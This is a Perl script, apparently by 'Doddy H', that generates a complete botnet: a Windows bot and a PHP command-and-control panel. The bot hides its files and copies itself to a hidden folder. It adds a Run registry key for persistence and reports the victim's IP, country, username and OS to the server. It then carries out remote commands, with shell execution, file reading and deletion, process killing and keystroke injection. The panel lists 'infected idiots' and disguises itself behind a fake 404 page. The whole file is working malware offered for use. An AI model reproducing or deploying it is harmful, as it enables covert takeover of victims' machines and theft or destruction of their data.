#!usr/bin/perl
#DH Botnet 0.2 Generator
#Coded By Doddy H

use Tk;
use Tk::Dialog;
use Digest::MD5 qw(md5_hex);

if ( $^O eq 'MSWin32' ) {
    use Win32::Console;
    Win32::Console::Free();
}

my $color_fondo = "black";
my $color_texto = "cyan";

my $win_bot =
  MainWindow->new( -background => $color_fondo, -foreground => $color_texto );
$win_bot->title("DH Botnet 0.2 Generator");
$win_bot->resizable( 0, 0 );
$win_bot->geometry("370x530+20+20");

$win_bot->Label(
    -text       => "-- == Server Configuration == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 70, -y => 20 );

$win_bot->Label(
    -text       => "Page : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 60 );
my $page = $win_bot->Entry(
    -text       => "http://localhost:8080/botnet/index.php",
    -background => $color_fondo,
    -foreground => $color_texto,
    -width      => 40
)->place( -x => 67, -y => 65 );
$win_bot->Label(
    -text       => "Timeout : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 90 );
my $timeout = $win_bot->Entry(
    -text       => "5",
    -background => $color_fondo,
    -foreground => $color_texto,
    -width      => 10
)->place( -x => 86, -y => 95 );
$win_bot->Label(
    -text       => "seconds",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 155, -y => 90 );
$win_bot->Label(
    -text       => "Directory : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 120 );
my $dir_hide = $win_bot->Entry(
    -text       => "c:/windows/TESTARGG",
    -width      => 35,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 95, -y => 125 );

$win_bot->Label(
    -text       => "-- == Database Configuration == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 60, -y => 160 );

$win_bot->Label(
    -text       => "Host : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 200 );
my $host = $win_bot->Entry(
    -text       => "localhost",
    -width      => 40,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 65, -y => 204 );
$win_bot->Label(
    -text       => "Username : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 228 );
my $user = $win_bot->Entry(
    -text       => "doddy",
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 102, -y => 233 );
$win_bot->Label(
    -text       => "Password : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 255 );
my $pass = $win_bot->Entry(
    -show       => "*",
    -text       => "",
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 98, -y => 260 );
$win_bot->Label(
    -text       => "Database : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 285 );
my $db = $win_bot->Entry(
    -text       => "botnet",
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 98, -y => 290 );

$win_bot->Label(
    -text       => "-- == Login == --",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 110, -y => 330 );

$win_bot->Label(
    -text       => "Username : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 368 );
my $user_login = $win_bot->Entry(
    -text       => "admin",
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 102, -y => 373 );

$win_bot->Label(
    -text       => "Password : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 395 );
my $pass_login = $win_bot->Entry(
    -text       => "admin",
    -width      => 30,
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 102, -y => 400 );

$win_bot->Label(
    -text       => "Timeout : ",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 20, -y => 423 );
my $timeout_botnet = $win_bot->Entry(
    -text       => "5",
    -background => $color_fondo,
    -foreground => $color_texto,
    -width      => 10
)->place( -x => 86, -y => 428 );
$win_bot->Label(
    -text       => "seconds",
    -font       => "Impact",
    -background => $color_fondo,
    -foreground => $color_texto
)->place( -x => 155, -y => 424 );

$win_bot->Button(
    -command          => \&generatenow,
    -text             => "Generate!",
    -font             => "Impact",
    -background       => $color_fondo,
    -foreground       => $color_texto,
    -width            => 30,
    -activebackground => $color_texto
)->place( -x => 50, -y => 470 );

MainLoop;

sub generatenow {

    my $code_server = q(#!usr/bin/perl
#DH Botnet Server
#Version 0.2
#Coded By Doddy H
#Command : perl2exe -gui server.pl

#Modules to install
#ppm install http://www.bribes.org/perl/ppm/Win32-API.ppd
#ppm install http://www.bribes.org/perl/ppm/Win32-GuiTest.ppd

use Win32;
use Win32::API;
use Win32::GuiTest qw(MouseMoveAbsPix SendKeys);
use Win32::Job;
use IO::Socket;
use Win32::OLE qw(in);
use Win32::Process;
use File::Basename;
use Win32::File;
use Win32::TieRegistry( Delimiter => "/" );

use LWP::UserAgent;

my $nave = LWP::UserAgent->new;
$nave->agent(
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12"
);
$nave->timeout(10);

## Main

my $url      = "ACA_VA_TU_LINK";
my $timeout  = "ACA_VA_EL_TIMEOUT";
my $dir_hide = "ACA_VA_EL_DIRECTORIO";

unless ( -d $dir_hide ) {
    mkdir( $dir_hide, 777 );
    hideit( $dir_hide, "hide" );
    chdir($dir_hide);
}
else {
    chdir($dir_hide);
}

unless ( -f "keys" ) {
    savefile( "keys", genpass(5) );
}

hideit( "keys", "hide" );

##Infect
hideit( $0, "hide" );
Win32::CopyFile( $0, $dir_hide . "/" . basename($0), 0 );
hideit( $dir_hide . "/" . basename($0), "hide" );
$Registry->{"LMachine/Software/Microsoft/Windows/CurrentVersion/Run//system34"}
  = $dir_hide . "/" . basename($0);

#

# Start the party

my ( $clave, $ip, $pais, $user, $os, $time ) = getmydata();

print "[+] Key : $clave\n";
print "[+] IP : $ip\n";
print "[+] Pais : $pais\n";
print "[+] Username : $user\n";
print "[+] OS : $os\n";
print "[+] Timeout : $time\n\n\n";

#

saludo( $clave, $ip, $pais, $user, $os, $time );    ## Registrar

#

while (true) {

    sleep $timeout;

    sigo_vivo($clave);                              ## Estado

    my ( $orden, $ar1, $ar2, $ar3 ) = ver_ordenes($clave);

    print "\n[+] Orden : $orden\n";
    print "[+] Ar1 : $ar1\n";
    print "[+] Ar2 : $ar2\n";
    print "[+] Ar3 : $ar3\n";

    if ( $orden eq "CMD" ) {
        my $code = ejecutate_esta($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "GetIP" ) {
        my $code = agarrate_la_ip($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "GetProcess" ) {
        my $code = getprocess();
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "KillProcess" ) {
        my $code = pisate_esta($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "ListDir" ) {
        my $code = cargate_esta($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "Delete" ) {
        my $code = borrate_esta($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "OpenFile" ) {
        my $code = openfilenow($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "OpenCD" ) {
        my $code = tengo_el_cd(1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "CloseCD" ) {
        my $code = tengo_el_cd(0);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "HideIcons" ) {
        my $code = cambios_jodidos( "iconos", 1 );
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "ShowIcons" ) {
        my $code = cambios_jodidos( "iconos", 0 );
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "HideTaskbar" ) {
        my $code = cambios_jodidos( "inicio", 1 );
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "ShowTaskbar" ) {
        my $code = cambios_jodidos( "inicio", 0 );
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "MSG" ) {
        my $code = mensajeate_esta( $ar1, $ar2 );
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "OpenWord" ) {
        my $code = write_word($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "SendKeys" ) {
        my $code = escribite_esta($ar1);
        mandar_rta( $clave, $code );
    }

    if ( $orden eq "CrazyMouse" ) {
        my $code = mouse_crazy($ar1);
        mandar_rta( $clave, $code );
    }

}

#
#

##

## Funciones primarias

## Funcion sigo_vivo()

sub sigo_vivo {

    tomar( $url, { "sigovivo" => "alpedo", "clavenow" => $_[0] } );

}

## Funcion mandar_rta()

sub mandar_rta {

    tomar( $url,
        { "mandocarajo" => "alpedo", "miclave" => $_[0], "mirta" => $_[1] } );

}

##

## Funcion ver_ordenes()

sub ver_ordenes {

    my $orden = "";
    my $arg1  = "";
    my $arg2  = "";
    my $arg3  = "";

    my $code = tomar( $url, { "ordenespabots" => "alpedo", "clave" => $_[0] } );
    chomp $code;

    if ( $code =~ /\[\+\] Orden : (.*?)<br>/ ) {
        $orden = $1;
    }

    if ( $code =~ /\[\+\] Arg1 : (.*?)<br>/ ) {
        $arg1 = $1;
    }

    if ( $code =~ /\[\+\] Arg2 : (.*?)<br>/ ) {
        $arg2 = $1;
    }

    if ( $code =~ /\[\+\] Arg3 : (.*?)<br>/ ) {
        $arg3 = $1;
    }

    return ( $orden, $arg1, $arg2, $arg3 );

}

##

## Funcion saludo()

sub saludo {

    my ( $clave, $ip, $pais, $user, $os, $time ) = @_;

    tomar(
        $url,
        {
            "entradatrasera" => "hidad",
            "key"            => $clave,
            "ip"             => $ip,
            "pais"           => $pais,
            "username"       => $user,
            "os"             => $os,
            "timeout"        => $time
        }
    );

}

##

## Funcion getmydata()

sub getmydata {

    my $clave = openfilenow("keys");
    my $ip;
    my $pais;
    my $user = Win32::LoginName();
    my $os   = Win32::GetOSName();

    my $code1 = toma("http://whatismyipaddress.com/");

    if ( $code1 =~
        /<input type="text" name="LOOKUPADDRESS" value="(.*)" maxlength/ )
    {
        $ip = $1;

    }
    else {

        my $code2 = toma("http://www.melissadata.com/lookups/iplocation.asp");

        if ( $code2 =~ /Your IP Address: (.*)<\/span>/ ) {
            $ip = $1;
        }
        else {
            $ip = "Not Found";
        }

    }

    if ( $code1 =~ /<tr><th>Country:<\/th><td>(.*)<\/td><\/tr>/ ) {
        $pais = $1;
    }
    else {

        my $code2 = toma(
            "http://www.melissadata.com/lookups/iplocation.asp?ipaddress=$ip");

        if ( $code2 =~ /Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/ ) {
            $pais = $2;
        }
        else {
            $pais = "Not Found";
        }

    }

    return ( $clave, $ip, $pais, $user, $os, $timeout );

}

##

## Kill Process

#print pisate_esta("aa");

sub pisate_esta {

    if ( Win32::Process::KillProcess( $_[0], "" ) ) {
        return "[+] Process Closed";
    }
    else {
        return "[-] Error";
    }

}

##

## GetProcess

#print getprocess();

sub getprocess {

    my $relleno;

    my $uno = Win32::OLE->new("WbemScripting.SWbemLocator");
    my $dos = $uno->ConnectServer( "", "root\\\\cimv2" );

    foreach my $pro ( in $dos->InstancesOf("Win32_Process") ) {
        $relleno .= "[+] Process Name : " . $pro->{Caption} . "\n";
        $relleno .= "[+] PID : " . $pro->{ProcessId} . "\n\n";
    }
    return $relleno;
}

##

## Get IP

#print agarrate_la_ip("www.petardas.com");

sub agarrate_la_ip {
    my $get = gethostbyname( $_[0] );
    return inet_ntoa($get);
}

##

##List Directory

#print cargate_esta("C:/xampp");

sub cargate_esta {

    my $relleno;

    if ( -d $_[0] ) {
        opendir( DIR, $_[0] );
        my @archivos = readdir DIR;
        for my $archivo (@archivos) {
            if ( -d $_[0] . "/" . $archivo ) {
                $relleno .= "[+] Directory : $archivo\n";
            }
            else {
                $relleno .= "[+] File : $archivo\n";
            }
        }
        return $relleno;
    }
    else {
        return "[-] Error";
    }

}

##

##Delete Fle

#print borrate_esta("C:/xampp/test");

sub borrate_esta {

    if ( -f $_[0] ) {
        if ( unlink( $_[0] ) ) {
            return "[+] File deleted";
        }
        else {
            return "[-] Error";
        }
    }
    elsif ( -d $_[0] ) {
        if ( rmdir( $_[0] ) ) {
            return "[+] Directory deleted";
        }
        else {
            return "[-] Error";
        }
    }
    else {
        return "[-] Error";
    }

}

##

## Open File

#print openfilenow("C:/xampp/htdocs/index.php");

sub openfilenow {

    if ( -f $_[0] ) {
        open my $FILE, q[<], $_[0];
        my $conte = join q[], <$FILE>;
        close $FILE;
        return $conte;
    }
    else {
        return "[-] File Not Found";
    }

}

##

##CMD

#print ejecutate_esta("net user");

sub ejecutate_esta {

    my $job = Win32::Job->new;
    $job->spawn(
        "cmd",
        qq{cmd /C $_[0]},
        {
            no_window => "true",
            stdout    => "logxfuck.txt",
            stderr    => "logxfuck.txt"
        }
    );

    $ok = $job->run("30");

    open my $FILE, q[<], "logxfuck.txt";
    my $wordf = join q[], <$FILE>;
    close $FILE;

    unlink("logxfuck.txt");

    return $wordf;

}

##

##Ocultar y mostrar

#cambios_jodidos("inicio",1);
#cambios_jodidos("iconos",1);

sub cambios_jodidos {

    my $as = new Win32::API( "user32", "FindWindow", "PP", "N" );
    my $b  = new Win32::API( "user32", "ShowWindow", "NN", "N" );

    if ( $_[0] eq "inicio" ) {

        if ( $_[1] eq "1" ) {
            $handlex = $as->Call( "Shell_TrayWnd", 0 );
            $b->Call( $handlex, 0 );
        }
        else {
            $handlex = $as->Call( "Shell_TrayWnd", 0 );
            $b->Call( $handlex, 1 );
        }

    }

    if ( $_[0] eq "iconos" ) {

        if ( $_[1] eq "1" ) {

            $handle = $as->Call( 0, "Program Manager" );
            $b->Call( $handle, 0 );
        }
        else {
            $handle = $as->Call( 0, "Program Manager" );
            $b->Call( $handle, 1 );
        }
    }
    return ("Ok");
}

##

##SendKeys

#escribite_esta("Viva el bananero");

sub escribite_esta {
    SendKeys(shift);
    return ("Ok");
}

##

## Word

#write_word("No tengas miedo");

sub write_word {

    my $text = $_[0];
    system("start winword.exe");
    sleep 3;
    escribite_esta($text);
    return ("Ok");
}

##

## Mouse Crazy

#mouse_crazy(666);

sub mouse_crazy {

    for my $number ( 1 .. $_[0] ) {
        MouseMoveAbsPix( $number, $number );
    }
    return "Ok";
}

##

## CD

#tengo_el_cd(0);

sub tengo_el_cd {

    my $ventana = Win32::API->new( "winmm", "mciSendString", "PPNN", "N" );
    my $rta = ' ' x 127;
    if ( $_[0] eq "1" ) {
        $ventana->Call( 'set CDAudio door open', $rta, 127, 0 );
    }
    else {
        $ventana->Call( 'set CDAudio door closed', $rta, 127, 0 );
    }
    return "Ok";
}

##

## MSG

#mensajeate_esta("Soy Dios","Obedeceme hijo xDD");

sub mensajeate_esta {
    Win32::MsgBox( $_[1], 0, $_[0] );
    return "Ok";
}

##

## Funciones secundarias

## Funcion hideit()

sub hideit {
    if ( $_[1] eq "show" ) {
        Win32::File::SetAttributes( $_[0], NORMAL );
    }
    elsif ( $_[1] eq "hide" ) {
        Win32::File::SetAttributes( $_[0], HIDDEN );
    }
}

##

## Generate Keys

sub genpass {

    my $length = shift;
    my $valor_car;
    my @re;

    my @mayus  = ( A .. Z );
    my @minus  = ( a .. z );
    my @number = ( 0 .. 9 );
    my @op     = ( 1 .. 3 );

    for ( 1 .. $length ) {

        my $opt = @op[ rand(@op) ];
        if ( $opt eq 1 ) {
            push( @re, @mayus[ rand(@mayus) ] );
        }
        elsif ( $opt eq 2 ) {
            push( @re, @minus[ rand(@minus) ] );
        }
        elsif ( $opt eq 3 ) {
            push( @re, @number[ rand(@number) ] );
        }
    }
    for my $val (@re) {
        chomp $val;
        $valor_car .= $val;
    }
    return $valor_car;
}

##

## Funcion savefile()

sub savefile {
    open( SAVE, ">>" . $_[0] );
    print SAVE $_[1];
    close SAVE;
}

##

## Funcion toma()

sub toma {
    return $nave->get( $_[0] )->content;
}

##

## Funcion tomar()

sub tomar {
    my ( $web, $var ) = @_;
    return $nave->post( $web, [ %{$var} ] )->content;
}

##

# The End ?);

    my $code_botnet = q(<?php

// DH Botnet
// Version 0.2
// Coded By Doddy H

// Datos

$username = "ACA_VA_TU_USER";
$password = "ACA_VA_TU_PASSWORD_EN_MD5";
$host = "ACA_VA_EL_HOST";
$userw = "ACA_VA_EL_USER";
$passw = "ACA_VA_EL_PASS";
$db = "ACA_VA_EL_NOMBRE";
$tiempo_de_carga = "ACA_VA_EL_TIEMPO_DE_CARGA";

//

// Start the party

error_reporting(0);
mysql_connect($host, $userw, $passw);
mysql_select_db($db);

//

// Registro
if (isset($_POST['entradatrasera'])) {
    $key = mysql_real_escape_string($_POST['key']);
    $ip = mysql_real_escape_string($_POST['ip']);
    $pais = mysql_real_escape_string($_POST['pais']);
    $username = mysql_real_escape_string($_POST['username']);
    $os = mysql_real_escape_string($_POST['os']);
    $timeout = mysql_real_escape_string($_POST['timeout']);
    $control = 0;
    $rea = mysql_query("select clave from slaves");
    while ($ver = mysql_fetch_array($rea)) {
        if ($ver[0] == $key) {
            $control = 1;
        }
    }
    if ($control == 0) {
        mysql_query("INSERT INTO slaves(id,clave,ip,pais,user,os,timeout)values(NULL,'$key','$ip','$pais','$username','$os','$timeout')");
        mysql_query("INSERT INTO ordenes(id,clave)values(NULL,'$key')");
    }
}
//
// Bots siguen vivos
if (isset($_POST['sigovivo'])) {
    $clave = mysql_real_escape_string($_POST['clavenow']);
    mysql_query("UPDATE slaves set estado='1' where clave='$clave'");
}
// Bots mandan rta
if (isset($_POST['mandocarajo'])) {
    $clave = mysql_real_escape_string($_POST['miclave']);
    $rta = mysql_real_escape_string($_POST['mirta']);
    mysql_query("UPDATE ordenes set rta='$rta' where clave='$clave'");
}
//
// Ordenes para bots
if (isset($_POST['ordenespabots'])) {
    $h = mysql_real_escape_string($_POST['clave']);
    $rea = mysql_query("select * from ordenes where clave='$h'");
    $ver = mysql_fetch_array($rea);
    $id = mysql_real_escape_string($ver[0]);
    $clave = mysql_real_escape_string($ver[1]);
    $orden = mysql_real_escape_string($ver[2]);
    $arg1 = mysql_real_escape_string($ver[3]);
    $arg2 = mysql_real_escape_string($ver[4]);
    $arg3 = mysql_real_escape_string($ver[5]);
    $rta = mysql_real_escape_string($ver[6]);
    echo "[+] ID : " . htmlentities($id) . "<br>";
    echo "[+] Clave : " . htmlentities($clave) . "<br>";
    echo "[+] Orden : " . htmlentities($orden) . "<br>";
    echo "[+] Arg1 : " . htmlentities($arg1) . "<br>";
    echo "[+] Arg2 : " . htmlentities($arg2) . "<br>";
    echo "[+] Arg3 : " . htmlentities($arg3) . "<br>";
    echo "[+] Rta : " . htmlentities($rta) . "<br>";
}
//
// Main
elseif (isset($_COOKIE['portal'])) {
    colores();
    $st = base64_decode($_COOKIE['portal']);
    $plit = preg_split("/@/", $st);
    $user = $plit[0];
    $pass = $plit[1];
    if ($user == $username and $pass == $password) {
        echo "<title>DH Botnet 0.2</title>";
        if (isset($_POST['instalar'])) {
            $todo = "
create table slaves (
id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
clave TEXT NOT NULL,
ip TEXT NOT NULL,
pais TEXT NOT NULL,
user TEXT NOT NULL,
os TEXT NOT NULL,
timeout TEXT NOT NULL,
estado TEXT NOT NULL,
PRIMARY KEY (id)
);
";
            $todo2 = "
create table ordenes (
id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
clave TEXT NOT NULL,
orden TEXT NOT NULL,
arg1 TEXT NOT NULL,
arg2 TEXT NOT NULL,
arg3 TEXT NOT NULL,
rta TEXT NOT NULL,
PRIMARY KEY (id)
);
";
            if (mysql_query($todo)) {
                if (mysql_query($todo2)) {
                    echo "<script>alert('Installed');</script>";
                }
            } else {
                echo "<script>alert('Error');</script>";
            }
        }
        if (mysql_num_rows(mysql_query("show tables like 'slaves'"))) {
            // TODO EL CODIGO DEL MENU
            if (isset($_POST['about'])) {
                echo "
<center>

<h1>[++] Commands :</h1><br><br>

<h2>
CMD [command]<br>
GetIP [host]<br>
GetProcess<br>
KillProcess [pid]<br>
ListDir [directory]<br>
Delete [file]<br>
OpenFile [file]<br>
OpenCD <br>
CloseCD<br>
HideIcons<br>
ShowIcons<br>
HideTaskbar<br>
ShowTaskbar<br>
MSG [title] [text]<br>
OpenWord [text]<br>
SendKeys [text]<br>
CrazyMouse [time]<br>
</h2>
<br><br><br>";
                echo '<a href="javascript:history.back()"><h1>Back</h1></a></center>';
                exit(1);
            }
            if (isset($_GET['borrar'])) {
                $id = $_GET['borrar'];
                if (is_numeric($id)) {
                    if (@mysql_query("delete from slaves where id='$id'")) {
                        if (@mysql_query("delete from ordenes where id='$id'")) {
                            echo "<script>alert('Deleted');</script>";
                            echo "<META HTTP-EQUIV='Refresh' CONTENT='0;URL=?'>";
                        }
                    }
                } else {
                    echo "<script>alert('DIE MOTHER FUCKER');</script>";
                }
            }
            if (isset($_GET['console'])) {
                $id = $_GET['console'];
                if (is_numeric($id)) {
                    $re = mysql_query("select * from ordenes where id='$id'");
                    $ver = mysql_fetch_array($re);
                    echo "<center><br><h1>Console</h1><br>";
                    echo "<center><textarea cols=80 rows=40 name=code>";
                    echo htmlentities($ver[6]);
                    echo "</textarea></center><br>";
                    echo '<a href="javascript:history.back()"><h1>Back</h1></a></center>';
                    // ACTUALIZAR A NADA
                    mysql_query("UPDATE ordenes set orden='',arg1='',arg2='',arg3='',rta='' where id=" . $id);
                    exit(1);
                } else {
                    echo "<script>alert('DIE MOTHER FUCKER');</script>";
                }
            }
            if (isset($_POST['mandarcmd'])) { // MUY IMPORTANTE
                $op = mysql_real_escape_string($_POST['options']);
                $id = mysql_real_escape_string($_POST['idiotas']);
                $orden1 = mysql_real_escape_string($_POST['cmd1']);
                $orden2 = mysql_real_escape_string($_POST['cmd2']);
                $orden3 = mysql_real_escape_string($_POST['cmd3']);
                mysql_query("UPDATE ordenes set orden='$op',arg1='$orden1',arg2='$orden2',arg3='$orden3' where id=" . $id);
                $re = mysql_query("select * from slaves where id='$id'");
                $ver = mysql_fetch_array($re);
                $timeout = $ver[6];
                $timeout = $timeout + $tiempo_de_carga;
                $time = $timeout;
                $timeout = $timeout * 1000;
                echo "<script>alert('Wait " . htmlentities($time) . " seconds');</script>";
                echo "
<script type=\"text/javascript\"> 
setTimeout (\"location.href='?console=$id'\",$timeout); 
</script>
";
            } //
            echo "
<br><br>
<center>
<h1>Infected idiots</h1>
<br><br>
";
            $re = mysql_query("select count(clave) from slaves");
            $ver = mysql_fetch_array($re);
            if ($ver[0] == 0) { //
                echo "<script>alert('No idiots');</script>";
            } else {
                $re = mysql_query("select * from slaves");
                echo "
<table border=1  width=1100>
<td ><b>ID</b></td><td ><b>Key</b></td><td ><b>IP</b></td><td ><b>Country</b></td><td ><b>Username</b></td><td ><b>OS</b></td><td ><b>Timeout</b></td><td><b>Status</b></td><td><b>Option</b></td><tr>
";
                $idiotas = array();
                while ($ver = mysql_fetch_array($re)) {
                    if ($ver[7] == 1) {
                        $estado = "Online";
                    } else {
                        $estado = "Offline";
                    }
                    echo "<td >" . htmlentities($ver[0]) . "</td><td >" . htmlentities($ver[1]) . "</td><td >" . htmlentities($ver[2]) . "</td><td >" . htmlentities($ver[3]) . "</td>";
                    echo "<td >" . htmlentities($ver[4]) . "</td><td >" . htmlentities($ver[5]) . "</td><td >" . htmlentities($ver[6]) . "</td><td>" . $estado . "<td><a href=?borrar=" . $ver[0] . ">Delete</a></td><tr>";
                    $idiotas[] = $ver[0];
                    mysql_query("UPDATE slaves set estado='' where id=" . $ver[0]);
                }
                echo "</table>";
            } //
            echo "<form action='' method=POST>";
            echo "

<br><br><br><br>

<table>
<td>
<b>Idiot :</b>
</td>
<td>
<select name=idiotas>";
            foreach($idiotas as $idiota) {
                echo "<option>" . $idiota . "</option>";
            }
            echo "
</select>
</td><tr>

<td><b>Options : </b></td>
<td><select name=options>
<option>CMD</option>
<option>GetIP</option>  
<option>GetProcess</option>
<option>KillProcess</option>
<option>ListDir</option>
<option>Delete</option>
<option>OpenFile</option>
<option>OpenCD</option>
<option>CloseCD</option>
<option>HideIcons</option>
<option>ShowIcons</option>
<option>HideTaskbar</option>
<option>ShowTaskbar</option>
<option>MSG</option>
<option>OpenWord</option>
<option>SendKeys</option>
<option>CrazyMouse</option>
</select></td><tr>

<td><b>Command 1 : </b></td><td><input type=text name=cmd1></td><tr>
<td><b>Command 2 : </b></td><td><input type=text name=cmd2></td><tr>
<td><b>Command 3 : </b></td><td><input type=text name=cmd3></td>
</table><br>
<input type=submit name=mandarcmd value=Send> <input type=submit name=about value=Help>
";
            echo "</form>";
            echo "<br><br><br><br><br><br><br><h2>-- == (C) Doddy Hackman 2012 || Contact : lepuke[at]hotmail[com] || Web : doddyhackman.webcindario.com == --</h2>";
        } else {
            echo "
<center><br><br>
<form action='' method=POST>
<h2>Want to install DH Botnet 0.2 ?</h2><br><br>
<input type=submit name=instalar value=Install>
</form>";
        }
        exit(1);
    }
} elseif (isset($_POST['login'])) {
    if ($_POST['user'] == $username and md5($_POST['passwor']) == $password) {
        setcookie("portal", base64_encode($_POST['user'] . "@" . md5($_POST['passwor'])));
        echo "<script>alert('Welcome idiot');</script>";
        echo '<meta http-equiv="refresh" content=0;URL=>';
    } else {
        echo "<script>alert('DIE MOTHER FUCKER DIE');</script>";
        echo '<meta http-equiv="refresh" content=0;URL=>';
    }
} elseif (isset($_GET['poraca'])) {
    colores();
    echo "
<br><h1><center>Login</center></h1>
<br><br><center>
<form action='' method=POST>
<b>Username : </b><input type=text name=user><br>
<b>Password : </b><input type=password name=passwor><br><br>
<input type=submit name=login value=Enter><br>
</form>
</center><br><br>";
} else {
    error();
}
//
// Funciones secundarias
function colores() {
    // Colores
    $color = "#00FF00";
    $fondo = "#000000";
    echo "

<STYLE type=text/css>

body,a:link {
background-color: $fondo;
color:$color;
Courier New;
cursor:crosshair;
font: normal 0.7em sans-serif,Arial;
}

input,textarea,fieldset,select,table,td,tr,option,select {
font: normal 13px Verdana, Arial, Helvetica,
sans-serif;
background-color:$fondo;
color:$color; 
border: solid 1px $color;
border-color:$color
}

a:link,a:visited,a:active {
color:$color;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>

";
}
function error() {
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>';
    exit(1);
}
// End
mysql_close();
//

// The End ?

?>);

##

    my ( $page, $timeout, $dir_hide ) =
      ( $page->get, $timeout->get, $dir_hide->get );

    $code_server =~ s/ACA_VA_TU_LINK/$page/;
    $code_server =~ s/ACA_VA_EL_TIMEOUT/$timeout/;
    $code_server =~ s/ACA_VA_EL_DIRECTORIO/$dir_hide/;

    unlink("botnet_server.pl");

    open( FILE_SERVER, ">>botnet_server.pl" );
    print FILE_SERVER $code_server;
    close FILE_SERVER;

###

    my $pro = $pass_login->get;
    my $pro = md5_hex($pro);

    my ( $user_login, $pass_login, $host, $user, $pass, $db, $timeout_botnet ) =
      (
        $user_login->get, $pro, $host->get, $user->get, $pass->get, $db->get,
        $timeout_botnet->get
      );

    $code_botnet =~ s/ACA_VA_TU_USER/$user_login/;
    $code_botnet =~ s/ACA_VA_TU_PASSWORD_EN_MD5/$pass_login/;
    $code_botnet =~ s/ACA_VA_EL_HOST/$host/;
    $code_botnet =~ s/ACA_VA_EL_USER/$user/;
    $code_botnet =~ s/ACA_VA_EL_PASS/$pass/;
    $code_botnet =~ s/ACA_VA_EL_NOMBRE/$db/;
    $code_botnet =~ s/ACA_VA_EL_TIEMPO_DE_CARGA/$timeout_botnet/;

    unlink("index.php");

    open( FILE_BOTNET, ">>index.php" );
    print FILE_BOTNET $code_botnet;
    close FILE_BOTNET;

    $win_bot->Dialog(
        -title            => "Oh Yeah",
        -buttons          => ["OK"],
        -text             => "Enjoy this botnet",
        -background       => $color_fondo,
        -foreground       => $color_texto,
        -activebackground => $color_texto
    )->Show();

}

#The End ?